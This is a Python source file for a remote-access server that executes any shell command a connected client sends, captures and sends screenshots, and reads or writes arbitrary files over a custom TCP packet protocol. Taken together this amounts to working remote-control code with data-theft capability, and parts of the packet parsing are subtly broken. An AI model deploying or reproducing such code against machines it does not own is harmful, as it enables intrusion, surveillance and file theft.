import os
import subprocess
import socket, sys
import struct, math
import pyautogui as py
import socket 
import io
import re

PACKET_SIZE = 50000
MAX_FILE_SIZE = 2000000000

# Creates and connects to a client socket
def connectSocket(HOST, PORT, debug: bool = False) -> socket:
    try:
        sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket
        if debug: 
            print('[+] Server Started')
            print('[+] Listening For Client Connection...')
        sckt.bind((HOST, PORT)) # Bind the socket to an adress and a port
        sckt.listen(1) # Listen for incoming connections
        client, client_addr = sckt.accept() 
        if debug:
            print(f'[+] {client_addr} Client connected to the server')   
        return client
    except (Exception): 
        return

# Implementation of the send() function with the packet system
def sendMsg(sckt: socket, dataToSend: bytearray, typeOfRequest: int,  debug: bool):
    try:
        nOfPacketsToSend = math.ceil(len(dataToSend) / PACKET_SIZE)
        bytesSent = 0

        # Loop through the packets
        for i in range(nOfPacketsToSend):
            packetLength = min(PACKET_SIZE, len(dataToSend)-bytesSent).to_bytes(4, "big")
            packetPackets = (nOfPacketsToSend-(i+1)).to_bytes(2, "big")
            packetTypeOfRequest = typeOfRequest.to_bytes(1, "big")
            packetPayload = dataToSend[i*PACKET_SIZE:(i*PACKET_SIZE)+min(PACKET_SIZE, len(dataToSend)-bytesSent)]
            packet = packetLength + packetPackets + packetTypeOfRequest + packetPayload
            bytesSent += min(PACKET_SIZE, len(dataToSend)-bytesSent)

            sckt.sendall(packet)
            if debug:
                print(f"[SENT] Header: packetLength {packetLength} | nOfPacketsLeft {packetPackets} | typeOfRequest {typeOfRequest}")
    except (Exception):
        return

# A "safer" and more convinient implementation of the standard recv() function
def recvAll(sckt: socket, n: int) -> bytearray:
    try:
        payload = sckt.recv(n)
        while (len(payload) < n):
            payload += sckt.recv(n-len(payload))
        return payload
    except:
        return b'EXIT0x02'

#                                                                              number of packets left to receive
# Implementation of the recvAll() function packet system --> packetHeader: 0x0 0x0 0x0 0x0 | 0x0 0x0 | 0x0
#                                                                                 ^       |             ^
#                                                                                 |       |             |
#                                                                           packet length | type of request (0x63 "c", 0x73 "v")
def recvMsg(sckt: socket, debug: bool = False) -> tuple:
    try:
        receivedData = b""
        packetHeader = recvAll(sckt, 7)

        packetLength = struct.unpack("i", packetHeader[:4])[0]
        packetPackets = packetHeader[4] + packetHeader[5]
        typeOfRequest = packetHeader[6]

        payload = recvAll(sckt, packetLength)
        receivedData += (payload)
        if debug:
            print(f"[RECEIVED] Header: packetLength {packetLength} | nOfPacketsLeft {packetPackets} | typeOfRequest {typeOfRequest}")

        # Check if an error occurred during the first packet fetching
        while packetPackets > 0:
            if not receivedData == b"EXIT0x02":
                packetHeader = recvAll(sckt, 6)

                packetLength = struct.unpack("i", packetHeader[:4])[0]
                packetPackets = packetHeader[4] + packetHeader[5]
                typeOfRequest = packetHeader[6]

                payload = recvAll(sckt, packetLength) 
                receivedData += (payload)
            else:
                return 0x00, b"EXIT0x02"
    
        return (packetHeader[6], receivedData)
    except:
        return 0x00, b"EXIT0x02"

def getCurrentDirectory() -> str:
    output = subprocess.run("cd", shell=True, capture_output=True)
    currentDir = (output.stdout[:len(output.stdout)-2]).decode()
    return currentDir

# Main server function
def mainServer(HOST, PORT, debug: bool = False):
    # Create the server-client socket
    clientSocket = connectSocket(HOST, PORT, debug)

    command = b""
    startedVideoShare = False
    currentDirectory = getCurrentDirectory()

    sendMsg(clientSocket, f"{currentDirectory}>".encode(), 0x63, debug)
    while True:
        print("\nim back here")
        typeOfRequest, command = recvMsg(clientSocket, debug)
        try:
            command: str = command.decode()
        except:
            command = "EXIT0x02"
        # DEBUG
        if debug and not command == "":
            print(f"[DEBUG] Command: {command} typeOfRequest: {typeOfRequest}")

        # Check for errors / exit command
        if command == "EXIT0x01":
            sys.exit(0)
        if command == "EXIT0x02":
            startedVideoShare = False
            clientSocket = connectSocket(HOST, PORT, debug)
            sendMsg(clientSocket, f"{currentDirectory}>".encode(), 0x63, debug)     

        # If the request is a string request (0x63 is "c" in ascii, it stands for char)
        if typeOfRequest == 0x63:

            # Getting current directory
            if command == "dir":
                command = f'dir "{currentDirectory}\\"'
            if command == "cd ..":
                currentDirectory = currentDirectory[:currentDirectory.rfind('\\')]
            if command.find("cd .") == -1 and command.find("cd ") != -1 and not re.match("[A-Z]:", command[3:]) and os.path.exists(f"{currentDirectory}\\{command[3:]}"):
                currentDirectory = f"{currentDirectory}\\{command[3:]}"
            if re.match("[A-Z]:", command):
                currentDirectory = command

            output = subprocess.run(command, shell=True, capture_output=True)
            
            # If the commmand has no output
            if output.stdout == b"":
                sendMsg(clientSocket, f"{currentDirectory}>".encode(), 99, debug)
            else:
                finalOutput = output.stdout + b"\n" + f"{currentDirectory}>".encode()
                sendMsg(clientSocket, finalOutput, 99, debug)

            # DEBUG
            if debug and not output.stdout == "":
                print(f"[DEBUG] Command output: {output.stdout}")

        # If the request is a video request (0x76 is "v" in ascii, it stands for video)
        if typeOfRequest == 0x76:

            # If the video request is a video start request
            if "start" in command and not startedVideoShare:
                startedVideoShare = True
                frame = py.screenshot() # Take a screenshot
                frameBytes = io.BytesIO()
                frame.save(frameBytes, format="PNG") # Convert it to a png file
                screenBuffer = frameBytes.getvalue()
                sendMsg(clientSocket, screenBuffer, 0x76, debug) # Send the data through the network

            # If the video request if a video stop request
            if "stop" in command:
                startedVideoShare = False
                sendMsg(clientSocket, b"[VIDEO] Video stream stopped!", 0x63, debug)
            
            # If the video request is a video continue command
            if "continue" in command:
                frame = py.screenshot()
                frameBytes = io.BytesIO()
                frame.save(frameBytes, format="PNG")
                screenBuffer = frameBytes.getvalue()
                sendMsg(clientSocket, screenBuffer, 0x76, debug)
        
        # If the request if a file request
        if typeOfRequest == 0x66:

            # If the file request is a "getfile" request
            if "getfile" in command:

                # Define the file path
                filePath = f"{currentDirectory}\\{command[8:]}" if command.find(":") == -1 else command[8:] 

                # Check if its bigger than 2GB and if the path exists
                if os.path.exists(filePath) and os.path.getsize(filePath) < MAX_FILE_SIZE :
                    # Read and send the file data
                    with open(filePath, "rb") as reader:
                        fileData = reader.read()
                        sendMsg(clientSocket, fileData, 0x66, debug)

                # If one of the conditions above isnt met, send an error message
                else:
                    errorMessage = f"EENo file with name {command[8:]} in {currentDirectory}\n>".encode()
                    sendMsg(clientSocket, errorMessage, 0x63, debug)
                    print("ERROR")
            
            if "sendfile " in command:
                
                # Get file name and save path if given any
                colonPos = command.find(":")
                fileName = command[9:] if colonPos == -1 else command[9:colonPos-2]
                savePath = f"{currentDirectory}\\{fileName}" if colonPos == -1 else f"{command[colonPos-1:]}\\{fileName}"

                # Get file data
                _, fileData = recvMsg(clientSocket, debug)

                # Write the data @ the save path
                with open(savePath, "wb") as writer:
                    writer.write(fileData)

                
                     



